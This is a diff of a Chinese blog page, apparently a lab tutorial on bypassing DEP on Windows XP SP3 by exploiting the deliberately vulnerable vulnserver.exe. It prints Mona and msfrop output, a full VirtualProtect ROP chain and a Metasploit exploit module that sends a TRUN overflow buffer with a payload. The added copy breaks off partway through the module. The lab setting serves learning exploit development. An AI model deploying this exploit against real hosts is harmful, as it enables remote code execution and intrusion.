@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-11-28T08:22:00.000Z">
-<meta property="article:modified_time" content="2023-12-09T15:24:52.405Z">
+<meta property="article:modified_time" content="2023-12-12T14:10:59.039Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="Metasploit">
 <meta name="twitter:card" content="summary">
@@ -143,9 +143,9 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">一、实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%90%AF%E7%94%A8mona%E8%84%9A%E6%9C%AC"><span class="nav-text">二、启用Mona脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E4%BC%9A%E8%A2%AB%E5%8A%A0%E8%BD%BD-.dll-%E6%96%87%E4%BB%B6"><span class="nav-text">1、查找所有会被加载 .dll 文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E9%9D%B6%E6%9C%BA%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E5%88%87%E6%8D%A2%E5%88%B0vlunserver.exe%E6%89%80%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%E6%89%A7%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4"><span class="nav-text">（1）在靶机的命令行中切换到vlunserver.exe所在的目录，执行如下命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8immunitydebugger%E6%9F%A5%E8%AF%A2"><span class="nav-text">（2）使用ImmunityDebugger查询</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-msfrop-%E4%B9%9F%E5%8F%AF%E6%9F%A5%E6%89%BE-rop-%E6%8C%87%E4%BB%A4%E7%89%87%E6%AE%B5%E7%A9%BF%E6%8F%92%E8%A1%A5%E5%85%85"><span class="nav-text">2、使用 msfrop
-也可查找 ROP 指令片段（穿插补充）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-mona-%E6%9F%A5%E6%89%BE%E5%B9%B6%E5%88%9B%E5%BB%BA-rop-%E9%93%BE"><span class="nav-text">3、使用 Mona 查找并创建 ROP 链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E7%BC%96%E5%86%99%E7%BB%95%E8%BF%87-dep-%E7%9A%84-metasploit-%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="nav-text">三、编写绕过 DEP 的
-Metasploit 渗透模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E4%BB%A3%E7%A0%81"><span class="nav-text">1、渗透代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84"><span class="nav-text">2、保存路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E8%A7%A3%E6%9E%90"><span class="nav-text">3、简要解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"><span class="nav-text">4、代码调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9Bmsf-%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-text">四、msf 运行测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">五、参考文献</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">1. 实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%AF%E7%94%A8mona%E8%84%9A%E6%9C%AC"><span class="nav-text">2. 启用Mona脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E4%BC%9A%E8%A2%AB%E5%8A%A0%E8%BD%BD-.dll-%E6%96%87%E4%BB%B6"><span class="nav-text">1、查找所有会被加载 .dll 文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%A8%E9%9D%B6%E6%9C%BA%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E5%88%87%E6%8D%A2%E5%88%B0vlunserver.exe%E6%89%80%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%E6%89%A7%E8%A1%8C%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4"><span class="nav-text">（1）在靶机的命令行中切换到vlunserver.exe所在的目录，执行如下命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8immunitydebugger%E6%9F%A5%E8%AF%A2"><span class="nav-text">（2）使用ImmunityDebugger查询</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-msfrop-%E4%B9%9F%E5%8F%AF%E6%9F%A5%E6%89%BE-rop-%E6%8C%87%E4%BB%A4%E7%89%87%E6%AE%B5%E7%A9%BF%E6%8F%92%E8%A1%A5%E5%85%85"><span class="nav-text">2、使用 msfrop
+也可查找 ROP 指令片段（穿插补充）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-mona-%E6%9F%A5%E6%89%BE%E5%B9%B6%E5%88%9B%E5%BB%BA-rop-%E9%93%BE"><span class="nav-text">3、使用 Mona 查找并创建 ROP 链</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E5%86%99%E7%BB%95%E8%BF%87-dep-%E7%9A%84-metasploit-%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97"><span class="nav-text">3. 编写绕过 DEP 的
+Metasploit 渗透模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E4%BB%A3%E7%A0%81"><span class="nav-text">1、渗透代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E5%AD%98%E8%B7%AF%E5%BE%84"><span class="nav-text">2、保存路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E8%A6%81%E8%A7%A3%E6%9E%90"><span class="nav-text">3、简要解析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"><span class="nav-text">4、代码调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf-%E8%BF%90%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="nav-text">4. msf 运行测试</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -245,7 +245,7 @@ Metasploit 渗透模块</span></a><ol class="nav-child"><li class="nav-item nav-
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-09 23:24:52" itemprop="dateModified" datetime="2023-12-09T23:24:52+08:00">2023-12-09</time>
+      <time title="修改时间：2023-12-12 22:10:59" itemprop="dateModified" datetime="2023-12-12T22:10:59+08:00">2023-12-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -283,21 +283,21 @@ Metasploit 渗透模块</span></a><ol class="nav-child"><li class="nav-item nav-
     
     
     <div class="post-body" itemprop="articleBody"><p><strong>备注：相关理论知识建议查看书籍</strong></p>
-<h2 id="一实验环境">一、实验环境</h2>
+<h2 id="实验环境">1. 实验环境</h2>
 <p><strong>攻击机：kali 2019-3</strong></p>
 <p><strong>靶机：winXPSP3（英文版）</strong></p>
-<p><strong>漏洞：vulnserver.exe（下载：</strong> <strong><a
+<p><strong>漏洞：vulnserver.exe（下载：<a
 target="_blank" rel="noopener" href="https://github.com/stephenbradshaw/vulnserver"
 class="uri">https://github.com/stephenbradshaw/vulnserver</a>）</strong></p>
-<h2 id="二启用mona脚本">二、启用Mona脚本</h2>
+<h2 id="启用mona脚本">2. 启用Mona脚本</h2>
 <h3 id="查找所有会被加载-.dll-文件">1、查找所有会被加载 .dll 文件</h3>
 <h4
 id="在靶机的命令行中切换到vlunserver.exe所在的目录执行如下命令">（1）在靶机的命令行中切换到vlunserver.exe所在的目录，执行如下命令</h4>
-<pre><code>vlunserver.exe 9999</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vlunserver.exe 9999</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155612239-1067443417.png" /></p>
 <h4 id="使用immunitydebugger查询">（2）使用ImmunityDebugger查询</h4>
-<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155658186-1976100869.png" />
-<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155912313-1763646230.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155658186-1976100869.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128155912313-1763646230.png" /></p>
 <ul>
 <li><strong>输入命令 !mona modules
 启用Mona脚本，就可以找到所有模块的信息。</strong></li>
@@ -306,178 +306,26 @@ id="在靶机的命令行中切换到vlunserver.exe所在的目录执行如下�
 <h3 id="使用-msfrop-也可查找-rop-指令片段穿插补充">2、使用 msfrop
 也可查找 ROP 指令片段（穿插补充）</h3>
 <p><strong>msfrop 命令（以msvcrt.dll为例）</strong></p>
-<pre><code>msf5 &gt; msfrop -v -s &quot;pop cex&quot; /root/Desktop/msvcrt.dll　　　　#使用-s参数进行查找，使用-v实现详细输出
-[*] exec: msfrop -v -s &quot;pop cex&quot; /root/Desktop/msvcrt.dll
-
-Collecting gadgets from /root/Desktop/msvcrt.dll
-Found 2320 gadgets
-
-/root/Desktop/msvcrt.dll gadget: 0x77c11285
-0x77c11285: add [eax], al
-0x77c11287: add bl, cl
-0x77c11289: dec ebp
-0x77c1128a: ret
-
-/root/Desktop/msvcrt.dll gadget: 0x77c112a9
-0x77c112a9: mov eax, 0f88a77c3h
-0x77c112ae: ret
-…………</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; msfrop -v -s <span class="string">&quot;pop cex&quot;</span> /root/Desktop/msvcrt.dll　　　　<span class="comment">#使用-s参数进行查找，使用-v实现详细输出</span></span><br><span class="line">[*] <span class="built_in">exec</span>: msfrop -v -s <span class="string">&quot;pop cex&quot;</span> /root/Desktop/msvcrt.dll</span><br><span class="line"></span><br><span class="line">Collecting gadgets from /root/Desktop/msvcrt.dll</span><br><span class="line">Found 2320 gadgets</span><br><span class="line"></span><br><span class="line">/root/Desktop/msvcrt.dll gadget: 0x77c11285</span><br><span class="line">0x77c11285: add [eax], al</span><br><span class="line">0x77c11287: add bl, cl</span><br><span class="line">0x77c11289: dec ebp</span><br><span class="line">0x77c1128a: ret</span><br><span class="line"></span><br><span class="line">/root/Desktop/msvcrt.dll gadget: 0x77c112a9</span><br><span class="line">0x77c112a9: mov eax, 0f88a77c3h</span><br><span class="line">0x77c112ae: ret</span><br><span class="line">…………</span><br></pre></td></tr></table></figure>
 <h3 id="使用-mona-查找并创建-rop-链">3、使用 Mona 查找并创建 ROP 链</h3>
 <p>通过使用immunity调试器中的Mona脚本，
 <strong>不仅可以找到ROP指令片段，还可以创建整个ROP链</strong></p>
-<p>使用命令 **!mona rop -m *.dll -cp nonull
-**就可以找到所有关于ROP代码片段的信息。</p>
-<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128160913684-482281778.png" />
-<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128160927479-515719958.png" /></p>
-<p>新生成的 <strong>rop_chains.txt
-</strong>文件中包含了可以直接用于渗透模块的完整ROP链。我们只需将这个ROP链复制到我们的渗透模块中即可。</p>
+<p>使用命令 **!mona rop -m *.dll -cp
+nonull**就可以找到所有关于ROP代码片段的信息。</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128160913684-482281778.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211128160927479-515719958.png" /></p>
+<p>新生成的
+<strong>rop_chains.txt</strong>文件中包含了可以直接用于渗透模块的完整ROP链。我们只需将这个ROP链复制到我们的渗透模块中即可。</p>
 <p><strong>为了创建一个可以触发VirtualProtect()函数的ROP链，对寄存器进行的设置（打开rop_chains.txt即可看到）：</strong></p>
-<pre><code>Register setup for VirtualProtect() :
---------------------------------------------
- EAX = NOP (0x90909090)
- ECX = lpOldProtect (ptr to W address)
- EDX = NewProtect (0x40)
- EBX = dwSize
- ESP = lPAddress (automatic)
- EBP = ReturnTo (ptr to jmp esp)
- ESI = ptr to VirtualProtect()
- EDI = ROP NOP (RETN)
- --- alternative chain ---
- EAX = ptr to &amp;VirtualProtect()
- ECX = lpOldProtect (ptr to W address)
- EDX = NewProtect (0x40)
- EBX = dwSize
- ESP = lPAddress (automatic)
- EBP = POP (skip 4 bytes)
- ESI = ptr to JMP [EAX]
- EDI = ROP NOP (RETN)
- + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Register setup <span class="keyword">for</span> VirtualProtect() :</span><br><span class="line">--------------------------------------------</span><br><span class="line"> EAX = NOP (0x90909090)</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class="line"> ESI = ptr to VirtualProtect()</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> --- alternative chain ---</span><br><span class="line"> EAX = ptr to &amp;VirtualProtect()</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = POP (skip 4 bytes)</span><br><span class="line"> ESI = ptr to JMP [EAX]</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> + place ptr to <span class="string">&quot;jmp esp&quot;</span> on stack, below PUSHAD</span><br></pre></td></tr></table></figure>
 <p><strong>创建的ROP 链：</strong></p>
-<pre><code>def create_rop_chain()
-
-　　# rop chain generated with mona.py - www.corelan.be
-　　rop_gadgets =
-　　[
-　　#[---INFO:gadgets_to_set_esi:---]
-　　0x77c2d7ba, # POP ECX # RETN [msvcrt.dll]
-　　0x6250609c, # ptr to &amp;VirtualProtect() [IAT essfunc.dll]
-　　0x7e41927f, # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]
-　　0x7c94d192, # XCHG EAX,ESI # RETN [ntdll.dll]
-　　#[---INFO:gadgets_to_set_ebp:---]
-　　0x77c42f04, # POP EBP # RETN [msvcrt.dll]
-　　0x625011c7, # &amp; jmp esp [essfunc.dll]
-　　#[---INFO:gadgets_to_set_ebx:---]
-　　0x77c4e0da, # POP EAX # RETN [msvcrt.dll]
-　　0xfffffdff, # Value to negate, will become 0x00000201
-　　0x7e44493b, # NEG EAX # RETN [USER32.dll]
-　　0x77f301e4, # XCHG EAX,EBX # RETN [GDI32.dll]
-　　#[---INFO:gadgets_to_set_edx:---]
-　　0x7c87f229, # POP EAX # RETN [kernel32.dll]
-　　0xffffffc0, # Value to negate, will become 0x00000040
-　　0x77eda3d7, # NEG EAX # RETN [RPCRT4.dll]
-　　0x77c58fbc, # XCHG EAX,EDX # RETN [msvcrt.dll]
-　　#[---INFO:gadgets_to_set_ecx:---]
-　　0x77c1f519, # POP ECX # RETN [msvcrt.dll]
-　　0x62504d79, # &amp;Writable location [essfunc.dll]
-　　#[---INFO:gadgets_to_set_edi:---]
-　　0x77c46116, # POP EDI # RETN [msvcrt.dll]
-　　0x77e8d224, # RETN (ROP NOP) [RPCRT4.dll]
-　　#[---INFO:gadgets_to_set_eax:---]
-　　0x77ead9ed, # POP EAX # RETN [RPCRT4.dll]
-　　0x90909090, # nop
-　　#[---INFO:pushad:---]
-　　0x77dfc5ee, # PUSHAD # RETN [ADVAPI32.dll]
-　　].flatten.pack(&quot;V*&quot;)
-
-　　return rop_gadgets
-
-end</code></pre>
-<h2 id="三编写绕过-dep-的-metasploit-渗透模块">三、编写绕过 DEP 的
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>()</span><br><span class="line"></span><br><span class="line">　　<span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">　　rop_gadgets =</span><br><span class="line">　　[</span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">　　<span class="number">0x77c2d7ba</span>, <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x6250609c</span>, <span class="comment"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span></span><br><span class="line">　　<span class="number">0x7e41927f</span>, <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]</span></span><br><span class="line">　　<span class="number">0x7c94d192</span>, <span class="comment"># XCHG EAX,ESI # RETN [ntdll.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">　　<span class="number">0x77c42f04</span>, <span class="comment"># POP EBP # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x625011c7</span>, <span class="comment"># &amp; jmp esp [essfunc.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">　　<span class="number">0x77c4e0da</span>, <span class="comment"># POP EAX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0xfffffdff</span>, <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">　　<span class="number">0x7e44493b</span>, <span class="comment"># NEG EAX # RETN [USER32.dll]</span></span><br><span class="line">　　<span class="number">0x77f301e4</span>, <span class="comment"># XCHG EAX,EBX # RETN [GDI32.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">　　<span class="number">0x7c87f229</span>, <span class="comment"># POP EAX # RETN [kernel32.dll]</span></span><br><span class="line">　　<span class="number">0xffffffc0</span>, <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">　　<span class="number">0x77eda3d7</span>, <span class="comment"># NEG EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">　　<span class="number">0x77c58fbc</span>, <span class="comment"># XCHG EAX,EDX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">　　<span class="number">0x77c1f519</span>, <span class="comment"># POP ECX # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x62504d79</span>, <span class="comment"># &amp;Writable location [essfunc.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">　　<span class="number">0x77c46116</span>, <span class="comment"># POP EDI # RETN [msvcrt.dll]</span></span><br><span class="line">　　<span class="number">0x77e8d224</span>, <span class="comment"># RETN (ROP NOP) [RPCRT4.dll]</span></span><br><span class="line">　　<span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">　　<span class="number">0x77ead9ed</span>, <span class="comment"># POP EAX # RETN [RPCRT4.dll]</span></span><br><span class="line">　　<span class="number">0x90909090</span>, <span class="comment"># nop</span></span><br><span class="line">　　<span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">　　<span class="number">0x77dfc5ee</span>, <span class="comment"># PUSHAD # RETN [ADVAPI32.dll]</span></span><br><span class="line">　　].flatten.pack(<span class="string">&quot;V*&quot;</span>)</span><br><span class="line"></span><br><span class="line">　　<span class="keyword">return</span> rop_gadgets</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<h2 id="编写绕过-dep-的-metasploit-渗透模块">3. 编写绕过 DEP 的
 Metasploit 渗透模块</h2>
 <h3 id="渗透代码">1、渗透代码</h3>
-<pre><code>    class MetasploitModule &lt;Msf::Exploit::Remote
-      Rank=NormalRanking
-    
-      include Msf::Exploit::Remote::Tcp
-    
-      def initialize(info=&#123;&#125;)
-        super(update_info(info,
-          &#39;Name&#39;           =&gt; &#39;DEP Bypass Exploit&#39;,
-          &#39;Description&#39;    =&gt; %q&#123;
-            DEP Bypass Using ROP Chains Example Module
-          &#125;,
-          &#39;Platform&#39;       =&gt; &#39;Windows&#39;,
-          &#39;Author&#39;         =&gt; [&#39;z9m8r8&#39;],
-          &#39;Payload&#39;        =&gt;
-            &#123;
-              &#39;space&#39;     =&gt; 312,
-              &#39;BadChars&#39;  =&gt; &quot;\x00&quot;
-            &#125;,
-           &#39;Targets&#39;      =&gt; 
-            [
-              [&#39;Windows XP&#39;, &#123;&#39;Offset&#39;  =&gt; 2006&#125;]
-            ],
-            &#39;DisclosureDate&#39;  =&gt; &#39;2021-09-26&#39;))
-        register_options(
-          [
-            Opt::RPORT(9999)
-          ],self.class
-        )
-      end
-    
-      def create_rop_chain()
-    
-        # rop chain generated with mona.py - www.corelan.be
-        rop_gadgets =
-        [
-          #[---INFO:gadgets_to_set_esi:---]
-          0x77c2d7ba,  # POP ECX # RETN [msvcrt.dll]
-          0x6250609c,  # ptr to &amp;VirtualProtect() [IAT essfunc.dll]
-          0x7e41927f,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]
-          0x7c94d192,  # XCHG EAX,ESI # RETN [ntdll.dll]
-          #[---INFO:gadgets_to_set_ebp:---]
-          0x77c42f04,  # POP EBP # RETN [msvcrt.dll]
-          0x625011c7,  # &amp; jmp esp [essfunc.dll]
-          #[---INFO:gadgets_to_set_ebx:---]
-          0x77c4e0da,  # POP EAX # RETN [msvcrt.dll]
-          0xfffffdff,  # Value to negate, will become 0x00000201
-          0x7e44493b,  # NEG EAX # RETN [USER32.dll]
-          0x77f301e4,  # XCHG EAX,EBX # RETN [GDI32.dll]
-          #[---INFO:gadgets_to_set_edx:---]
-          0x7c87f229,  # POP EAX # RETN [kernel32.dll]
-          0xffffffc0,  # Value to negate, will become 0x00000040
-          0x77eda3d7,  # NEG EAX # RETN [RPCRT4.dll]
-          0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll]
-          #[---INFO:gadgets_to_set_ecx:---]
-          0x77c1f519,  # POP ECX # RETN [msvcrt.dll]
-          0x62504d79,  # &amp;Writable location [essfunc.dll]
-          #[---INFO:gadgets_to_set_edi:---]
-          0x77c46116,  # POP EDI # RETN [msvcrt.dll]
-          0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
-          #[---INFO:gadgets_to_set_eax:---]
-          0x77ead9ed,  # POP EAX # RETN [RPCRT4.dll]
-          0x90909090,  # nop
-          #[---INFO:pushad:---]
-          0x77dfc5ee,  # PUSHAD # RETN [ADVAPI32.dll]
-        ].flatten.pack(&quot;V*&quot;)
-    
-        return rop_gadgets
-    
-      end
-    
-      def exploit
-        connect
-        rop_chain=create_rop_chain()
-        junk=rand_text_alpha_upper(target[&#39;Offset&#39;])
-        buf=&quot;TRUN .&quot;+junk+rop_chain+make_nops(16)+payload.encoded+&#39;\r\n&#39;
-        sock.put(buf)
-        handler
-        disconnect
-      end
-    end</code></pre>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt;<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Exploit</span><span class="symbol">:</span><span class="symbol">:Remote</span></span><br><span class="line">  <span class="title class_">Rank</span>=<span class="title class_">NormalRanking</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::Tcp</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">    <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span>           =&gt; <span class="string">&#x27;DEP Bypass Exploit&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span>    =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">        DEP Bypass Using ROP Chains Example Module</span></span><br><span class="line"><span class="string">      &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span>       =&gt; <span class="string">&#x27;Windows&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span>         =&gt; [<span class="string">&#x27;z9m8r8&#x27;</span>],</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span>        =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&#x27;space&#x27;</span>     =&gt; <span class="number">312</span>,</span><br><span class="line">          <span 